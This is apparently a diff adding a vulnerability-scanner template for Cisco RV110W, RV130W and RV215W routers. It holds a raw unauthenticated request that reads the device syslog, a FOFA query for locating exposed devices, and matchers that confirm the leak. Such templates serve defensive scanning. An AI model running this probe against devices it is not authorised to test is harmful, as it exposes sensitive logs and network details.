@@ -1,0 +1,27 @@
+id: cisco-rv110w-rv130w-rv215w-router-information-leakage
+
+info:
+  name: Cisco RV110W RV130W RV215W router Information leakage
+  author: SleepingBag945
+  severity: info
+  description: |
+    A remote attacker can read the syslog file of the device,The syslog log may contain important and sensitive information, thereby threatening the security of the entire system.
+  metadata:
+    fofa-query: body="image/login_progress.gif" && title="Login Page" && cert="Cisco Small Business"
+  tags: infoleak
+
+http:
+  - raw:
+      - |
+        POST /_syslog.txt  HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && contains(body_1,"new AAA") && contains(body_1,"Ethernet LAN")'
+        condition: and
